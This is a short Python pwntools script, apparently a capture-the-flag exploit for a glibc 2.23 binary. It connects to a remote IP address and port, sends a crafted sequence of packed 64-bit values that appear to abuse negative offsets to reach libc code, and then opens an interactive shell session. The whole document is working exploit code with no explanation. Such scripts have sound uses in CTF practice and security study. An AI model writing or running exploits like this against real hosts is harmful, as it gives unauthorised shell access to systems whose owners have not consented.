from pwn import *
from LD import*
LD=change_ld('./main','./ld-2.23.so')
p = LD.process(env={'LD_PRELOAD':'./libc-2.23.so'})
p = remote("182.92.73.10", "36642")
Max = 0x10000000000000000
payload  = p64(1)+p64(Max - 0xE8)
payload += p64(13)
payload += p64(0)
payload += p64(Max - 4)
payload += p64(9)
payload += p64(25)
payload += p64(13)
payload += p64(9)
payload += p64(13)
payload += p64(1)
payload += p64(0xD0917)
payload += p64(25)
payload += p64(11)
payload += p64(1)
payload += p64(Max -0xE8)
payload += p64(1)
payload += p64(Max - 0x4121B)
payload += p64(1)
payload += p64(Max - 0xF0)
payload += p64(13)
payload += p64(25)
payload += p64(13)

p.send(payload)
p.interactive()
